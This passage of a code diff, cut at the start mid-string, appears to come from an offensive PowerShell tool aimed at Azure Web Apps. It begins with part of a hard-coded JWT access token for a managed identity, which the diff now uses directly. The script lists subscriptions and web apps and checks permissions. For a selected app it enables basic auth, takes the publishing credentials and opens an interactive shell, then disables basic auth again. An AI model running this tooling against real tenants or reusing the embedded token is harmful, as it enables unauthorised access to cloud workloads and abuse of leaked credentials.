wcy9PZmZlbnNpdmVfU2hha2VkL3Byb3ZpZGVycy9NaWNyb3NvZnQuTWFuYWdlZElkZW50aXR5L3VzZXJBc3NpZ25lZElkZW50aXRpZXMvTUlTIiwieG1zX3JkIjoiMC5BVW9BdGY4S0JnZ0NFZ0xoQWhJVUNBa1NFQ3h5RUxXYVp4OUhvLTlBdjVYSDNUb1NGQWdJRWhCR1NIOTVBTHJYVDdwRDJzSDQ5akFURWhRSUN4SVFDTHQ0ZG1YS1QwWWlJVlN3M3JvazJBIiwieG1zX3N1Yl9mY3QiOiI5IDMiLCJ4bXNfdGNkdCI6MTc3MjEwMDE3Nn0.DAV9VUhRHSm-UdCyEvEbRF7nkvI2uHvpWoGNgyHDftzn9PEHbfT6P4NC3tsOGTN52_aRZmPmfSVjONw6BTa6IwpScSRNRrviROd5ZuShVwZhHRssMBeB07t3rphRYdu3tCt5u7TuJ7jEdR0fUDj6U5h_KH3AjVHchRD1qbpl0YwdX6t2i1PPeqfoTN_8VZob83hrTFvTKbP_I_Rja09fcn8KLVk1YAby-OgXVGGfKr-b3_z-8iBLWQJBHAHXBogjeDiytSZwsGeM63y6aRr8m0lXBjQxTAG0hB1A1mdy49Cm_dqcWpE_B9QXB1ok2UIpsIecXTuT2HK_yFEbMN3LyA"
+$headers = @{ Authorization = "Bearer $token" }
 
-function main {
-    param (
-        [string]$AccessToken,
-        [string]$ClientID,
-        [string]$ClientSecret,
-        [string]$Identity,
-        [string]$TenantName
-    )
- 
-    if (-not $TenantName) {
-        Write-Host "[-] Must specify TenantName" -ForegroundColor Red
-        return
-    }
- 
-    # Resolve tenant
-    $global:TenantID = Get-DomainName -DomainName $TenantName
-    if (-not $global:TenantID) {
-        Write-Host "[-] Could not resolve TenantID. Exiting." -ForegroundColor Red
-        return
-    }
- 
+# Enumerate
+$subscriptions = Get-Subscriptions -Headers $headers
+if ($subscriptions.Count -eq 0) {
+    Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
+    exit 1
+}
 
-    if ($Identity) {
-        # Managed Identity - manual token
-        Invoke-GetTokens -AccessToken $Identity | Out-Null
-    }
-    elseif ($ClientID -and $ClientSecret) {
-        # Service Principal
-        Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null
-    }
-    else {
-        # User - Device Code Flow
-        Invoke-GetTokens -DomainName $TenantName | Out-Null
-    }
- 
+$webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
+if ($webApps.Count -eq 0) {
+    Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
+    exit 1
+}
 
-    if (-not $global:AccessToken) {
-        Write-Host "[-] Failed to acquire token. Exiting." -ForegroundColor Red
-        return
-    }
- 
-    $headers = Get-AuthHeaders
- 
-    # Enumerate subscriptions
-    $subscriptions = Get-Subscriptions -Headers $headers
-    if ($subscriptions.Count -eq 0) {
-        Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
-        return
-    }
- 
+$webApps = Check-Permissions -WebApps $webApps -Headers $headers
 
-    $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
-    if ($webApps.Count -eq 0) {
-        Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
-        return
+# Main loop
+while ($true) {
+    Show-WebAppMenu -WebApps $webApps
+
+    $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"
+
+    if ($choice -match "^[Qq]$") {
+        Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
+        break
     }
- 
-    # Check permissions
-    $webApps = Check-Permissions -WebApps $webApps -Headers $headers
- 
-    # Interactive loop
-    while ($true) {
-        Show-WebAppMenu -WebApps $webApps
- 
-        $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"
- 
-        if ($choice -match "^[Qq]$") {
-            Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
-            break
-        }
- 
-        if ($choice -eq "0") {
-            Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
-            $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
-            $webApps = Check-Permissions -WebApps $webApps -Headers $headers
-            continue
-        }
- 
-        $index = [int]$choice - 1
-        if ($index -lt 0 -or $index -ge $webApps.Count) {
-            Write-Host "[!] Invalid selection." -ForegroundColor Red
-            continue
-        }
- 
-        $selectedApp = $webApps[$index]
-        Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan
- 
-        if ($selectedApp.Permission -match "No Access") {
-            Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
-            continue
-        }
- 
-        # Enable basic auth
-        Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
- 
-        # Get publishing credentials
-        $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
-        if (-not $creds) {
-            Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
-            Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
-            continue
-        }
- 
-        # Start shell
-        Start-InteractiveShell -App $selectedApp -Creds $creds
- 
-        # Cleanup: disable basic auth
-        Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
+
+    if ($choice -eq "0") {
+        Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
+        $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
+        $webApps = Check-Permissions -WebApps $webApps -Headers $headers
+        continue
+    }
+
+    $index = [int]$choice - 1
+    if ($index -lt 0 -or $index -ge $webApps.Count) {
+        Write-Host "[!] Invalid selection." -ForegroundColor Red
+        continue
+    }
+
+    $selectedApp = $webApps[$index]
+    Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan
+
+    if ($selectedApp.Permission -match "No Access") {
+        Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
+        continue
+    }
+
+    # Enable basic auth
+    Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
+
+    # Get publishing credentials
+    $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
+    if (-not $creds) {
+        Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
         Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
-        Write-Host ""
+        continue
     }
+
+    # Start shell
+    Start-InteractiveShell -App $selectedApp -Creds $creds
+
+    # Cleanup: disable basic auth
+    Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
+    Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
+    Write-Host ""
 }
- 
-main -TenantName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret -Identity $Identity -AccessToken $AccessToken
- 
+
+WebApp-Shell
 }
- 
